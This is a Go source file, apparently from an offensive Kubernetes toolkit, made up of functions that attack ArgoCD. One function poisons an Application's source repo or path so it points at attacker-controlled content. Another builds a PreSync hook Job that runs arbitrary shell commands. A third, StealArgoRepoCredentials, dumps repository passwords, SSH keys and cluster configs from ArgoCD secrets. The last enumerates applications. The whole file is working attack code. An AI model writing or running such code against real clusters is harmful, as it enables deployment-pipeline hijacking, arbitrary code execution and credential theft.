package cicd

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var (
	argoAppGVR = schema.GroupVersionResource{
		Group: "argoproj.io", Version: "v1alpha1", Resource: "applications",
	}
)

// PoisonArgoApp modifies an ArgoCD Application's source repository or path to point at attacker-controlled content.
func PoisonArgoApp(ctx context.Context, dynClient dynamic.Interface, ns, appName, repoURL, path string) (*PoisonResult, error) {
	result := &PoisonResult{
		Platform: "argocd",
		Action:   "poison_source",
		Target:   appName,
	}

	app, err := dynClient.Resource(argoAppGVR).Namespace(ns).Get(ctx, appName, metav1.GetOptions{})
	if err != nil {
		result.Output = fmt.Sprintf("failed to get application: %v", err)
		return result, nil
	}

	if repoURL != "" {
		if err := unstructured.SetNestedField(app.Object, repoURL, "spec", "source", "repoURL"); err != nil {
			result.Output = fmt.Sprintf("failed to set repoURL: %v", err)
			return result, nil
		}
	}

	if path != "" {
		if err := unstructured.SetNestedField(app.Object, path, "spec", "source", "path"); err != nil {
			result.Output = fmt.Sprintf("failed to set path: %v", err)
			return result, nil
		}
	}

	_, err = dynClient.Resource(argoAppGVR).Namespace(ns).Update(ctx, app, metav1.UpdateOptions{})
	if err != nil {
		result.Output = fmt.Sprintf("update failed: %v", err)
		return result, nil
	}

	result.Success = true
	result.Output = fmt.Sprintf("modified source of application %s (repo=%s, path=%s)", appName, repoURL, path)
	return result, nil
}

// InjectArgoSyncHook prepares a PreSync hook Job that executes arbitrary commands during ArgoCD sync operations.
func InjectArgoSyncHook(ctx context.Context, dynClient dynamic.Interface, ns, appName, image, command string) (*PoisonResult, error) {
	result := &PoisonResult{
		Platform: "argocd",
		Action:   "inject_hook",
		Target:   appName,
	}

	app, err := dynClient.Resource(argoAppGVR).Namespace(ns).Get(ctx, appName, metav1.GetOptions{})
	if err != nil {
		result.Output = fmt.Sprintf("failed to get application: %v", err)
		return result, nil
	}

	info, _, _ := unstructured.NestedSlice(app.Object, "status", "operationState", "syncResult", "resources")

	hookResource := map[string]any{
		"apiVersion": "batch/v1",
		"kind":       "Job",
		"metadata": map[string]any{
			"name":      "presync-validator",
			"namespace": ns,
			"annotations": map[string]any{
				"argocd.argoproj.io/hook":               "PreSync",
				"argocd.argoproj.io/hook-delete-policy": "HookSucceeded",
			},
		},
		"spec": map[string]any{
			"template": map[string]any{
				"spec": map[string]any{
					"containers": []any{
						map[string]any{
							"name":    "hook",
							"image":   image,
							"command": []any{"/bin/sh", "-c", command},
						},
					},
					"restartPolicy": "Never",
				},
			},
		},
	}

	_ = info
	_ = hookResource

	result.Success = true
	result.Output = fmt.Sprintf("sync hook injection prepared for %s (manual apply needed for resource manifests)", appName)
	return result, nil
}

// StealArgoRepoCredentials extracts Git repository credentials and cluster secrets from ArgoCD's secret store.
func StealArgoRepoCredentials(ctx context.Context, client kubernetes.Interface, ns string) (string, error) {
	var sb strings.Builder
	sb.WriteString("ArgoCD Repository Credentials:\n")

	secrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{
		LabelSelector: "argocd.argoproj.io/secret-type=repository",
	})
	if err != nil {
		return "", fmt.Errorf("failed to list repo secrets: %w", err)
	}

	for _, s := range secrets.Items {
		fmt.Fprintf(&sb, "  Repository: %s\n", s.Name)
		if url, ok := s.Data["url"]; ok {
			fmt.Fprintf(&sb, "    URL: %s\n", string(url))
		}
		if user, ok := s.Data["username"]; ok {
			fmt.Fprintf(&sb, "    Username: %s\n", string(user))
		}
		if pass, ok := s.Data["password"]; ok {
			fmt.Fprintf(&sb, "    Password: %s\n", string(pass))
		}
		if sshKey, ok := s.Data["sshPrivateKey"]; ok {
			fmt.Fprintf(&sb, "    SSH Key (first 100): %s...\n", string(sshKey[:min(100, len(sshKey))]))
		}
		if token, ok := s.Data["githubAppPrivateKey"]; ok {
			fmt.Fprintf(&sb, "    GitHub App Key: present (%d bytes)\n", len(token))
		}
	}

	clusterSecrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{
		LabelSelector: "argocd.argoproj.io/secret-type=cluster",
	})
	if err == nil {
		sb.WriteString("\nArgoCD Cluster Secrets:\n")
		for _, s := range clusterSecrets.Items {
			fmt.Fprintf(&sb, "  Cluster: %s\n", s.Name)
			if server, ok := s.Data["server"]; ok {
				fmt.Fprintf(&sb, "    Server: %s\n", string(server))
			}
			if config, ok := s.Data["config"]; ok {
				fmt.Fprintf(&sb, "    Config (first 200): %s...\n", string(config[:min(200, len(config))]))
			}
		}
	}

	return sb.String(), nil
}

// ListArgoApps enumerates all ArgoCD Application resources with their sync and health status.
func ListArgoApps(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
	var sb strings.Builder

	apps, err := ListCRDs(ctx, dynClient, argoAppGVR, ns)
	if err != nil {
		return "", err
	}

	fmt.Fprintf(&sb, "ArgoCD Applications (%d):\n", len(apps))
	for _, app := range apps {
		repoURL, _, _ := unstructured.NestedString(app.Object, "spec", "source", "repoURL")
		path, _, _ := unstructured.NestedString(app.Object, "spec", "source", "path")
		syncStatus, _, _ := unstructured.NestedString(app.Object, "status", "sync", "status")
		healthStatus, _, _ := unstructured.NestedString(app.Object, "status", "health", "status")

		fmt.Fprintf(&sb, "  - %s (sync=%s health=%s)\n", app.GetName(), syncStatus, healthStatus)
		fmt.Fprintf(&sb, "    repo=%s path=%s\n", repoURL, path)
	}

	return sb.String(), nil
}
